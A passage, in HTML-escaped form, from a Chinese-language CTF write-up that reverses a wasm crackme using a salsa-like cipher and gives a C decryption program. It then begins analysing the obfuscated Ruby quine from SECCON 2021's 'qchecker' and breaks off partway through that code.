        v55 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v36;
        v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_3504[v55 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// 3504 中存的是 0-9a-f
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        res &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (v34 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v37);
        &lt;span style=&#34;color:#75715e&#34;&gt;// 后半部分相似
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再简化一下就是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; strlen(input); i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; j];
        v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_3504[cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;];
        v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
        v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loc_3504[cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;];
        res &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (v34 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v37) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (v43 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v46);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以只需要让加密结果转 hex 后等于密文即可&lt;/p&gt;
&lt;p&gt;同样的方法，翻译一下第一个 while 循环&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    cipher[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是想要找一下前八位是什么，发现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;    v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i32_load(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36LL&lt;/span&gt;);
    v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; w2c_f20(v12);
    i32_store(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;w2c_memory, v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28LL&lt;/span&gt;, v13);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是猜是把第二个参数的前 8 字节存到了 cipher 的前 8 字节&lt;/p&gt;
&lt;p&gt;这样就分析完了整个加密流程，每次取 8 字节明文，使用类似 &lt;code&gt;salsa&lt;/code&gt; 加密的核心算法，生成的结果与 hexstring 进行比较&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define ROL(a,b) (((a) &amp;lt;&amp;lt; (b)) | ((a) &amp;gt;&amp;gt; (8 - (b))))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define REQUARTERROUND(x, a, b, c, d) \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[a] ^= ROL((x[d] + x[c]) &amp;amp; 0xff, 4); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[d] ^= ROL((x[c] + x[b]) &amp;amp; 0xff, 3); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[c] ^= ROL((x[b] + x[a]) &amp;amp; 0xff, 2); \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    x[b] ^= ROL((x[a] + x[d]) &amp;amp; 0xff, 1); 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; in){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        REQUARTERROUND(in, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;);
        REQUARTERROUND(in, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;);
        REQUARTERROUND(in,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
        REQUARTERROUND(in,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
        REQUARTERROUND(in, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;);
        REQUARTERROUND(in, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;);
        REQUARTERROUND(in,  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        REQUARTERROUND(in,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;);
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; enc[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        &lt;span style=&#34;color:#ae81ff&#34;&gt;109u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;132u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;247u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;60u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;246u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;161u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;18u&lt;/span&gt;, 
         &lt;span style=&#34;color:#ae81ff&#34;&gt;38u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;139u&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;82u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;94u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;165u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;80u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;166u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;101u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;226u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;28u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;178u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;227u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;225u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;58u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;247u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;227u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;234u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;14u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;203u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;82u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;245u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;185u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;205u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;165u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;182u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;82u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;43u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;30u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;151u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;135u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;52u&lt;/span&gt;, 
         &lt;span style=&#34;color:#ae81ff&#34;&gt;85u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;63u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;29u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;86u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;212u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;175u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;148u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;191u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;195u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;244u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;214u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;140u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;143u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;186u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;158u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;238u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;207u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;64u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;53u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;85u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;11u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145u&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;6u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;247u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;13u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;87u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;209u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;166u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;205u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;175u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;50u&lt;/span&gt;, 
         &lt;span style=&#34;color:#ae81ff&#34;&gt;17u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;234u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;170u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;120u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;215u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;26u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;144u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;56u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;183u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;27u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;230u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;33u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;36u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;30u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;139u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;96u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;138u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;67u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;177u&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;7u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;248u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;134u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;15u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;84u&lt;/span&gt;, 
         &lt;span style=&#34;color:#ae81ff&#34;&gt;58u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;176u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;24u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;154u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;160u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;99u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;128u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;13u&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;228u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;186u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;231u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;208u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;177u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;16u&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;69u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;184u&lt;/span&gt;
    }; &lt;span style=&#34;color:#75715e&#34;&gt;// 先用 python 把 hexstring 转换回来
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        decrypt(enc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, enc[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j]);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;secconctf-2021qchecker&#34;&gt;[SECCONCTF 2021]qchecker&lt;/h2&gt;
&lt;p&gt;这道题是 ruby 混淆&lt;/p&gt;
&lt;p&gt;程序的空格会拼成 SECCON 的字样&lt;/p&gt;
&lt;p&gt;测试后发现错误的输入会让程序拼成 WRONG. 的字样&lt;/p&gt;
&lt;p&gt;整理一下格式，理解程序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;eval$uate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%w(
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    a=%(eval$uate=%w(#{$uate})*&amp;#34;&amp;#34;);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Bftjarzs=b=-&amp;gt;a{a.split(?+).map{|b|b.to_i(36)}};
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    c=b[&amp;#34;awyiv4fjfkuu2pkv+awyiv4fvut716g3j+axce5e4pxrogszr3+5i0omfd5dm9xf9q7+axce5e4khrz21ypr+5htqqi9iasvmjri7+axcc76i03zrn7gu7+cbt4m8xybr3cb27+1ge6snjex10w3si9+1k8vdb4fzcys2yo0&amp;#34;];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    d,e,f,g,h,i=b[&amp;#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j&amp;#34;];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    (j=eval(?A&amp;lt;&amp;lt;82&amp;lt;&amp;lt;71&amp;lt;&amp;lt;86)[0])
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;amp;&amp;amp; d==0 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;amp;&amp;amp; (
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        e+=1;k=2**64;l=-&amp;gt;(a,b){(a-j.ord)*256.pow(b-2,b)%b};
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        f=l[f,k+13];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        g=l[g,k+37];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        h=l[h,k+51];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        i=l[i,k+81];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        j==?}&amp;amp;&amp;amp;(d=e==32&amp;amp;&amp;amp;f+g+h+i==0?2:1);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        a.sub!(/&amp;#34;0.*?&amp;#34;/,&amp;#39;&amp;#34;0&amp;#39;+[d,e,f,g,h,i].map{|x|x.to_s(36)}*?+&amp;lt;&amp;lt;34)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    );
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    srand(f);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    k=b[&amp;#34;7acw+jsjm+46d84&amp;#34;];
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    l=d==2?7:6;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    m=[?#*(l*20)&amp;lt;&amp;lt;10]*11*&amp;#34;&amp;#34;;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    l.times{
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        |a|b=d==0&amp;amp;&amp;amp;e!=0?rand(4):0;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        9.times{
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            |e|9.times{
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                |f|(c[k[d]/10**a%10]&amp;gt;&amp;gt;(e*9+f)&amp;amp;1)!=0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                &amp;amp;&amp;amp;(
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    g=f;
